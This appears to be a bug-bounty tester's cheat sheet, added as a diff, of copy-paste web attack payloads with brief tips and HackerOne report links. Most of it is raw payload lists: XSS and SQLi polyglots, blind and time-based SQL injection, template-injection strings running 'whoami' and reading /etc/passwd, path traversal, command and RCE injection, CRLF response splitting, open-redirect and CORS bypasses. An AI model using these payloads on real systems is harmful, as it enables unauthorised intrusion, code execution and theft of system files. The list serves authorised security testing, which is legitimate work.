@@ -1,0 +1,286 @@
+Not a complete list by any means, but when you're manually testing and walking through sites and need a quick copy/paste, this can come in handy...
+https://github.com/1N3/IntruderPayloads
+
+Testing payment flow:
+Change the order quantity to 0.6 or 0.2 you may be able to pay significantly less for an item: https://hackerone.com/reports/403783
+============================================================
+Password Reset Token not expiring after new one generated: https://hackerone.com/reports/15166
+
+=============================================================
+
+Misconfigured CORS:
+Inject the following header in the request:
+        Origin: https://example.com
+If the server responds with the following:
+        Access-Control-Allow-Origin: https://example.com
+        Access-Control-Allow-Credentials: true
+        
+You can also try:
+        Origin: null
+and hopefully get:
+        Access-Control-Allow-Origin: null
+        Access-Control-Allow-Credentials: true        
+
+============================================================
+Improper Access Control:
+If you notice two types of user accounts, like shop owner and shop user. Try sending HTTP requests that only shop owner can send as shop user. 
+        -If creating new shop is only available to shop owner, try sending the HTTP request that creates a new shop as shop user. 
+
+Testing different levels of users admin vs user
+        -can regular user send an HTTP request that only admins should be able to send? example: https://hackerone.com/reports/219192
+==========================================================
+
+Subdomain takeover:
+aquatone-takeover -d test.com
+============================================================
+
+
+Company
+First Last
+username
+username@mailinator.com
+Password123$
++1416312384
+===================================================================================================
+
+IDOR:
+Try bruteforcing hashed numerical IDs with intruder
+Try to identify parameters which aren't essential towards the request. Use repeater to delete each parameter one at a time
+
+Interesting IDOR where it was only validating username belonged to the specific record ID: https://hackerone.com/reports/148764
+===================================================================================================
+
+Race Conditions:
+"Copy as Curl Command" 
+
+===================================================================================================
+API Calls:
+-Try to discover every single request method, and execute each request method with users of different privilege levels
+        - GET, POST, PUT, DELETE, HEAD, OPTIONS, PATCH
+-Test for IDORs
+-Discover API Endpoints
+        -Google Dorks site:target.com inurl:/api/v2 
+        -Query wayback machine: target.com/api/*
+        -CC.py
+-Send the same API request multiple times to see if it triggers anything (coupon codes, etc) 
+-If you ever come across undocumented or internal API, always try to a conduct a comprehensive mapping and recon to uncover all edges that might lack sufficient authorizations. https://yassineaboukir.com/blog/
+        -He found an API https://www.company.com/api/users/<User_ID>/ and discovered an edge located at /credit_cards/<CC_ID>. This unknown edge allowed him to discover credit card numbers and mail messages of users
+
+===================================================================================================
+
+OPEN REDIRECT: 
+google.com
+https://google.com
+//google.com
+//google.com/?:
+.google.com
+https:google.com
+//google%E3%80%82com
+\/\/google.com/
+/\/google.com/
+//google%00.com
+/%09/google.com
+/%5cgoogle.com
+//www.google.com/%2f%2e%2e
+//www.google.com/%2e%2e
+/\victim.com:80%40google.com
+http://www.theirsite.com@yoursite.com/ (oldie, but browsers will redirect to anything after @)
+http://www.yoursite.com/http://www.theirsite.com/
+";alert(0);//
+java%0d%0ascript%0d%0a:alert(0)
+javas&#x09;cript://www.google.com/%0Aalert(1)                      (thank you to https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md)
+%2F%2F%2Fjavascript:alert(document.domain);                               https://yassineaboukir.com/blog/
+data:text/html;base64,PHNjcmlwdD5hbGVydChsb2NhdGlvbik8L3NjcmlwdD4=%23//          https://yassineaboukir.com/blog/
+
+===================================================================================================
+Rate Limits:
+%00, %0d%0a, %09, %0C, %20, %0
+firstlastcompany%0a%0d%00
+
+Test to see if a certain functionality can be abused by spammers. (Sending Emails, Posting Comments, Posting)
+
+===================================================================================================
+
+File Inclusion:
+https://google.com/.injectx/rfi_vuln.txt
+https://google.com/.injectx/rfi_vuln.txt?`whoami`
+https://google.com/.injectx/rfi_vuln.txt%00.png
+https://google.com/.injectx/rfi_vuln.txt%00.html
+page=1
+page=./1
+page=.//1
+page=././1
+page=../pages/1
+page=\1
+../../../../../../../../../../../etc/passwd%00
+file://path/to/file
+file:///etc/./passwd 
+
+===================================================================================================
+how to fuzz for XSS:
+<test>
+;<test>
+"<u>test123
+'<u>test123
+" onerror=alert(1)
+javascript:alert(1)
+"+alert(1)+                    (if in script tags)
+<b/onbeforescriptexecute=proasdf        (sometimes HTML tags aren't blocked due to markdown, try to test the event handlers)
+<img>                                            (sometimes HTML tags aren't blocked due to markdown, try to test the event handlers)
+<a>                                              (sometimes HTML tags aren't blocked due to markdown, try to test the event handlers)
+
+XSS Fuzzing:
+test123
+<u>test123
+;<u>test123
+"<u>test123
+'<u>test123
+<b/onbeforescriptexecute=proasdf
+test"><test123>
+"><p/onload=location.replace'\
+<img src=”x” onerror=alert(1)> 
+<img/on=><img/onerror='confirm(1)'src=#>
+<div onmouseover="alert('XSS');">Hello :)
+alert/**/(1)// instead of alert(1)
+https://www.youtube.com/channel/UCfEQwwHP5t-MFdF-647n79w?fuzzing" onload=alert(document.domain) x="   <--------- https://hackerone.com/reports/333008
+
+Cross Site Scripting:
+Reflected Parameters
+javascript:alert(1)//
+"><img/onload=alert(1)>' -- 
+"></textarea><img/onload=alert(1)>' -- 
+'>"><iframe/onload=alert(1)></iframe>
+INJECTX'>"><ScRiPt>confirm(1)<ScRiPt>
+"></textarea><img/onload=alert(1)>' -- // INJECTX <!-- 
+"><img/onload=alert(1)>' -- // INJECTX <!-- 
+en%0AContent-Length%3A%200%0A%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2Fhtml%0AContent-Length%3A%2020%0A%3Chtml%3EINJECTX%3C%2Fhtml%3E%0A%0A
+%0AContent-Length%3A%200%0A%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2Fhtml%0AContent-Length%3A%2020%0A%3Chtml%3EINJECTX%3C%2Fhtml%3E%0A%0A
+<sVg%0Ao%00nload=%09((pro\u006dpt))()//
+"]);}catch(e){}if(!self.a)self.a=!alert(document.domain);//
+"a")(({type:"ready"}));}catch(e){alert(1)}//
+\%22})))}catch(e){alert(document.domain);}//
+
+
+XSS Polyglots:
+';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
+">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg"> ￼￼
+" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+javascript://plus.google.com/?%0aalert%28document.domain%29  FRANS ROSEN https://labs.detectify.com/2015/06/06/google-xss-turkey/
+
+https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md
+===================================================================================================
+
+Server Side Template Injection:
+Backslash Powered Scanner
+
+{{4*4}}[[5*5]] <---- if we identify angularJS template engine running
+{{4+4}}
+{7*7}
+"></script>{{2*2}}${2*2}
+7*7
+<%=`id`%>                (ruby template engine)
+\x41
+{% import os %}{{ os.popen("whoami").read() }}
+{% import os %}{{ os.popen("cat /etc/passwd").read() }}
+
+===================================================================================================
+
+Command Injection: 
+sleep 5; sleep 5 || sleep 5 | sleep 5 & sleep 5 && sleep 5
+Backslash Powered Scanner
+
+===================================================================================================
+SSRF:
+file	:///asd
+file	:///etc/passwd
+127.0.0.1.xip.io
+If you cannot access any sensitive services via SSRF, try to access sensitive files or pages that require higher application level privileges: 
+        https://hackerone.com/reports/312647
+If SSRF is rendering the website you are pointing it to, see if you can point it to an XSS.html file that you host on your server:
+        https://hackerone.com/reports/197902
+===================================================================================================
+
+SQLi:
+Backslash Powered Scanner
+SQLipy
+Rule of thumb: What payloads trigger an error message or an HTTP 500? 
+id=1‘
+'"
+1‘’
+1%cc‘
+1’-sleep(10)-’
++sleep(1)+
+1"
+1"“
+1%cc”
+1"-sleep(10)-”
+1/1
+1/0
+1/sleep(10)
+1\
+admin" or "1"="1"-- 
+admin' or '1'='1'-- 
+/*'*/
+'-sleep(100) --                         <---- username field 
+-sleep/*f*/(10)                     <------ integer item_id=111-sleep/*f*/(10)
+
+
+SQLi Fuzzing:
+Rule of thumb: What payloads trigger an error message or an HTTP 500? How does the baseline request compare with fuzzing request? Are the same results returned? 
+Do the results of the query change after inserting these? If you get different results then you are probably modifying the query
+
+--
+'
+\'
+'%23
+'#
+' -- 
+-- '          (try commenting out the quote) 
+# '           (try commenting out the quote) if query still works, then you just introduced sql comments into the query
+%23 '         (try commenting out the quote) 
+%2527         (some servers will double URL decode) 
+)
+))
+/*'*/          (try commenting out the quote)
+'' vs ''' (even vs odd number of quotes)
+id=460-5 (try subtracting)
+input) order by 5%23
+2/*dhab bc*/OR/*dahdshka*/2/*sd*/LIKE/*da*/"2"/**/%23
+' waitfor delay'00:00:10'-- -
+
+
+SQLi Polyglots:
+SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/
+SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR"*/ FROM some_table WHERE ex = ample
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
+
+SQLinjection in JSON: https://hackerone.com/reports/150156
+
+
+Blind SQLi
+‘%2Bbenchmark(3200,SHA1(1))%2B’
+' or benchmark(10000000,md5(1))='
+‘+BENCHMARK(40000000,SHA1(1337))+’
+
+Time/Blind Based SQLi:
+Check out "SQL Injection Time Based Payloads" 
+https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection/payloads-sql-blind
+===================================================================================================
+
+RCE:
+page=1`sleep 10
+1|sleep 10
+1$(sleep 10)
+1%0asleep 10%0a
